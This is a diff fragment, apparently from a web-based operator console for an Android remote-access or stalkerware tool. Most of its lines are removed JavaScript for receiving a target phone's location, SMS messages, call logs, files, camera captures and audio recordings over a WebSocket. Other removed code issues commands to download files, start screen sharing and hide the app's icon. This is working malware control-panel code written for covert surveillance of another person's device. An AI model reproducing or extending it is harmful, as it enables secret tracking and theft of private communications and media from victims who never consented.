-            setStatus(msg.substring(7));
-        } else if (msg.startsWith("LOC_DATA:")) {
-            try {
-                const data = JSON.parse(msg.substring(9));
-                renderMap(data);
-            } catch (err) { console.error(err); }
-        } else if (msg.startsWith("FILE_LIST:")) {
-            try {
-                currentData = JSON.parse(msg.substring(10));
-                dataType = 'file';
-                renderFiles();
-            } catch (err) { console.error(err); }
-        } else if (msg.startsWith("SMS_DATA:")) {
-            try {
-                currentData = JSON.parse(msg.substring(9));
-                dataType = 'sms';
-                renderTable();
-            } catch (err) { console.error(err); }
-        } else if (msg.startsWith("CALL_DATA:")) {
-            try {
-                currentData = JSON.parse(msg.substring(10));
-                dataType = 'call';
-                renderTable();
-            } catch (err) { console.error(err); }
-        } else if (msg.startsWith("CAMERA_IMAGE:")) {
-            const base64 = msg.substring(13);
-            displayCapturedImage(base64);
-        } else if (msg.startsWith("AUDIO_RECORDING:")) {
-            showAudio(msg.substring(16));
-        } else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
-            screenActive = true;
-            document.getElementById('screenBtn').innerText = 'Stop Screen';
-            showNotification('Screen share started');
-        } else if (msg.startsWith("SCREEN_SHARE_STOPPED")) {
-            screenActive = false;
-            document.getElementById('screenBtn').innerText = 'Start Screen';
-            if (screenPC) { screenPC.close(); screenPC = null; }
-            showNotification('Screen share stopped');
-        } else if (msg.startsWith("APP_HIDDEN")) {
-            iconHidden = true;
-            document.getElementById('iconBtn').innerText = 'Show Icon';
-            showNotification('App icon hidden');
-        } else if (msg.startsWith("APP_SHOWN")) {
-            iconHidden = false;
-            document.getElementById('iconBtn').innerText = 'Hide Icon';
-            showNotification('App icon shown');
-        } else if (msg.startsWith("VIBRATE_DONE")) {
-            showNotification('Vibration done');
-        } else if (msg.startsWith("ERROR:")) {
-            panel.innerHTML = `<div style="color:#d32f2f;">Error: ${msg.substring(6)}</div>`;
-        } else if (msg.startsWith("FILE_DATA:")) {
-            const base64 = msg.substring(10);
-            downloadBase64(base64, 'downloaded_file');
-        } else {
-            console.log('Unhandled plain text:', msg);
-        }
-    }
-
-    function setStatus(s) {
-        const el = document.getElementById('status');
-        el.innerText = s;
-        el.style.background = s === 'ONLINE' ? '#e8f5e9' : '#ffebee';
-        el.style.color = s === 'ONLINE' ? '#2e7d32' : '#c62828';
-    }
-
-    // ---------- CAMERA UI ----------
-    function toggleCameraPanel(panelId) {
-        const clickPanel = document.getElementById('clickCameraPanel');
-        const livePanel = document.getElementById('liveCameraPanel');
-        if (panelId === 'click') {
-            clickPanel.classList.toggle('show');
-            livePanel.classList.remove('show');
-        } else {
-            livePanel.classList.toggle('show');
-            clickPanel.classList.remove('show');
-        }
-    }
-
-    function capturePicture() {
-        const camera = document.querySelector('input[name="clickCameraSelect"]:checked').value;
-        const useFlash = document.getElementById('clickFlashCheckbox').checked;
-        sendCommand('CAMERA_SNAPSHOT', { camera, flash: useFlash });
-    }
-
-    function displayCapturedImage(base64) {
-        panel.innerHTML = `
-            <img src="data:image/jpeg;base64,${base64}">
-            <div style="margin-top:10px;">
-                <button onclick="downloadBase64('${base64}', 'snapshot_${Date.now()}.jpeg')">SAVE IMAGE</button>
-            </div>
-        `;
-    }
-
-    // ---------- LIVE STREAM ACTIONS (snapshot/record) ----------
-    function takeSnapshot() {
-        const video = document.getElementById('liveCamVideo');
-        if (!video || !video.videoWidth) {
-            alert('No live video or video not ready');
-            return;
-        }
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        canvas.toBlob(blob => {
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `snapshot_${Date.now()}.png`;
-            a.click();
-            URL.revokeObjectURL(url);
-        }, 'image/png');
-    }
-
-    function toggleRecording() {
-        const video = document.getElementById('liveCamVideo');
-        if (!video || !video.srcObject) {
-            alert('No live stream');
-            return;
-        }
-        if (mediaRecorder && mediaRecorder.state === 'recording') {
-            mediaRecorder.stop();
-            document.getElementById('recordBtn').innerText = 'Record Video';
-        } else {
-            recordedChunks = [];
-            const stream = video.srcObject;
-            mediaRecorder = new MediaRecorder(stream);
-            mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
-            mediaRecorder.onstop = () => {
-                const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                const url = URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = `recording_${Date.now()}.webm`;
-                a.click();
-                URL.revokeObjectURL(url);
-            };
-            mediaRecorder.start();
-            document.getElementById('recordBtn').innerText = 'Stop Recording';
-        }
-    }
-
-    // ---------- APP ICON TOGGLE ----------
-    function toggleAppIcon() {
-        if (iconHidden) sendCommand('showApp');
-        else sendCommand('hideApp');
-    }
-
-    // ---------- RENDERERS ----------
-    function showAudio(base64) {
-        panel.innerHTML = `
-            <audio controls src="data:audio/3gp;base64,${base64}"></audio>
-            <button onclick="downloadBase64('${base64}', 'recording.3gp')">Download</button>
-        `;
-    }
-
-    function downloadBase64(b64, filename) {
-        const a = document.createElement('a');
-        a.href = 'data:application/octet-stream;base64,' + b64;
-        a.download = filename;
-        a.click();
-    }
-
-    function renderMap(loc) {
-        panel.innerHTML = '<div id="map" style="position:relative;"></div>';
-        const mapDiv = document.getElementById('map');
-
-        const infoDiv = document.createElement('div');
-        infoDiv.className = 'map-info';
-        infoDiv.innerHTML = `
-            <div class="coord">📍 ${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}</div>
-            <div>🎯 Accuracy: ${loc.accuracy ? loc.accuracy.toFixed(1) : '?'} m</div>
-            <div>📡 Provider: ${loc.provider || 'unknown'}</div>
-            <div class="addr">🌍 Loading address...</div>
-        `;
-        mapDiv.appendChild(infoDiv);
-
-        if (mapInstance) mapInstance.remove();
-        mapInstance = L.map(mapDiv).setView([loc.lat, loc.lon], 18);
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
-        L.circle([loc.lat, loc.lon], { radius: loc.accuracy || 10, color: '#1976ff' }).addTo(mapInstance);
-
-        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${loc.lat}&lon=${loc.lon}&zoom=18&addressdetails=1`, {
-            headers: { 'User-Agent': 'SystemSync-Console/1.0' }
-        })
-        .then(response => response.json())
-        .then(data => {
-            const address = data.display_name || 'Address not found';
-            infoDiv.querySelector('.addr').innerHTML = `🌍 ${address}`;
-        })
-        .catch(err => {
-            console.error('Geocoding error:', err);
-            infoDiv.querySelector('.addr').innerHTML = '🌍 Address unavailable';
-        });
-    }
-
-    function renderTable() {
-        if (!currentData || currentData.length === 0) {
-            panel.innerHTML = '<p>No data</p>';
-            return;
-        }
-
-        let headers = [], rows = [];
-        if (dataType === 'sms') {
-            headers = ['Type', 'Number', 'Message', 'Date'];
-            rows = currentData.map(item => [item.type, item.number, item.body, item.date]);
-        } else if (dataType === 'call') {
-            headers = ['Type', 'Number', 'Name', 'Date', 'Duration'];
-            rows = currentData.map(item => [
-                item.type,
-                item.number,
-                item.name || '',
-                item.date,
-                item.duration + 's'
-            ]);
-        } else {
-            panel.innerHTML = '<p>Unknown data type</p>';
-            return;
-        }
-
-        const pageSize = 20;
-        const totalPages = Math.ceil(rows.length / pageSize);
-        const start = currentPage * pageSize;
-        const pageRows = rows.slice(start, start + pageSize);
-
-        let html = '<table><thead><tr>';
-        headers.forEach(h => html += `<th>${h}</th>`);
-        html += '</tr></thead><tbody>';
-
-        pageRows.forEach(r => {
-            html += '<tr>';
-            r.forEach(cell => html += `<td>${cell}</td>`);
-            html += '</tr>';
-        });
-        html += '</tbody></table>';
-
-        if (totalPages > 1) {
-            html += '<div class="pagination">';
-            for (let i = 0; i < totalPages; i++) {
-                html += `<button class="page-btn" onclick="gotoPage(${i})">${i+1}</button>`;
-            }
-            html += '</div>';
-        }
-
-        panel.innerHTML = html;
-    }
-
-    function gotoPage(p) {
-        currentPage = p;
-        renderTable();
-    }
-
-    function renderFiles() {
-        let html = `
-            <div class="file-manager">
-                <div class="file-toolbar-sticky">
-                    <div class="file-toolbar">
-                        <button onclick="navigateUp()">⬆ Up</button>
-                        <span class="file-path">${currentPath}</span>
-                        <div class="download-selected">
-                            <button onclick="downloadSelected()">Download Selected (${selectedFiles.length})</button>
-                        </div>
-                    </div>
-                </div>
-        `;
-
-        if (!currentData || currentData.length === 0) {
-            html += '<p style="padding:20px;">No files found.</p>';
-        } else {
-            const folders = currentData.filter(item => item.isDir);
-            const files = currentData.filter(item => !item.isDir);
-            selectedFiles = [];
-
-            html += `
-                <div class="file-panes">
-                    <div class="folder-pane">
-                        <div class="pane-title">Folders</div>
-                        <div id="folderList">
-            `;
-
-            folders.forEach(f => {
-                html += `
-                    <div class="folder-item" onclick="handleFolderClick('${f.path}')">
-                        <span class="folder-icon">📁</span>
-                        <span class="folder-name">${f.name}</span>
-                    </div>
-                `;
-            });
-
-            html += `
-                        </div>
-                    </div>
-                    <div class="file-pane">
-                        <div class="pane-title">Files</div>
-                        <div id="fileList">
-            `;
-
-            files.forEach(f => {
-                const path = f.path;
-                const name = f.name;
-                const size = formatBytes(f.size);
-                html += `
-                    <div class="file-item">
-                        <input type="checkbox" class="file-checkbox" data-path="${path}" onchange="updateSelected(this)">
-                        <span class="file-icon">📄</span>
-                        <span class="file-name">${name}</span>
-                        <span class="file-size">${size}</span>
-                    </div>
-                `;
-            });
-
-            html += `
-                        </div>
-                    </div>
-                </div>
-            `;
-        }
-
-        html += '</div>';
-        panel.innerHTML = html;
-    }
-
-    function handleFolderClick(path) {
-        currentPath = path;
-        sendCommand('ls ' + path);
-    }
-
-    function navigateUp() {
-        if (currentPath === 'root' || currentPath === '') return;
-        let parts = currentPath.split('/');
-        parts.pop();
-        let parent = parts.join('/');
-        if (parent === '') parent = 'root';
-        currentPath = parent;
-        sendCommand('ls ' + parent);
-    }
-
-    function updateSelected(checkbox) {
-        const path = checkbox.dataset.path;
-        if (checkbox.checked) {
-            if (!selectedFiles.includes(path)) selectedFiles.push(path);
-        } else {
-            selectedFiles = selectedFiles.filter(p => p !== path);
-        }
-        const downloadBtn = document.querySelector('.download-selected button');
-        if (downloadBtn) {
-            downloadBtn.innerText = `Download Selected (${selectedFiles.length})`;
-        }
-    }
-
-    function downloadSelected() {
-        if (selectedFiles.length === 0) {
-            alert('No files selected');
-            return;
-        }
-        selectedFiles.forEach(path => {
-            sendCommand('dl ' + path);
-        });
-    }
-
-    function formatBytes(b) {
-        if (b === 0) return '0 B';
-        const k = 1024, sizes = ['B','KB','MB','GB'];
-        const i = Math.floor(Math.log(b)/Math.log(k));
-        return (b/Math.pow(k,i)).toFixed(1) + ' ' + sizes[i];
-    }
-
-    function showNotification(text) {
-        const status = document.getElementById('status');
-        const orig = status.innerText;
-        status.innerText = text;
-        setTimeout(() => { status.innerText = orig; }, 2000);
-    }
-
-    // ---------- WEBSOCKET CONNECTION ----------
-    function connect() {
-        ws = new WebSocket(WS_URL);
-        ws.onopen = () => {
-            console.log('WebSocket connected');
-            setStatus('ONLINE');
-        };
-        ws.onmessage = (e) => {
-            const msg = e.data;
-            if (msg.startsWith('{')) {
-                try {
-                    const json = JSON.parse(msg);
-                    handleJSON(json);
-                } catch (err) {
-                    console.error('Invalid JSON:', msg);
-                }
-            } else {
-                handlePlainText(msg);
-            }
-        };
-        ws.onclose = () => {
-            console.log('WebSocket closed, reconnecting...');
-            setStatus('OFFLINE');
-            setTimeout(connect, 3000);
-        };
-        ws.onerror = (err) => {
-            console.error('WebSocket error:', err);
-        };
-    }
-
-    // ---------- ATTACH FUNCTIONS TO WINDOW (for onclick handlers) ----------
-    window.toggleScreen = toggleScreen;
-    window.toggleCameraPanel = toggleCameraPanel;
-    window.capturePicture = capturePicture;
-    window.startLiveStream = startLiveStream;
-    window.stopLiveStream = stopLiveStream;
-    window.toggleLiveAudio = toggleLiveAudio;
-    window.stopLiveAudio = stopLiveAudio;
-    window.sendCommand = sendCommand;
-    window.toggleAppIcon = toggleAppIcon;
-    window.takeSnapshot = takeSnapshot;
-    window.toggleRecording = toggleRecording;
-    window.downloadBase64 = downloadBase64;
-    window.gotoPage = gotoPage;
-    window.handleFolderClick = handleFolderClick;
-    window.navigateUp = navigateUp;
-    window.updateSelected = updateSelected;
-    window.downloadSelected = downloadSelected;
-
-    // ---------- START ----------
-    connect();
+    connectWebSocket();
 </script>
 </body>
 </html>
-
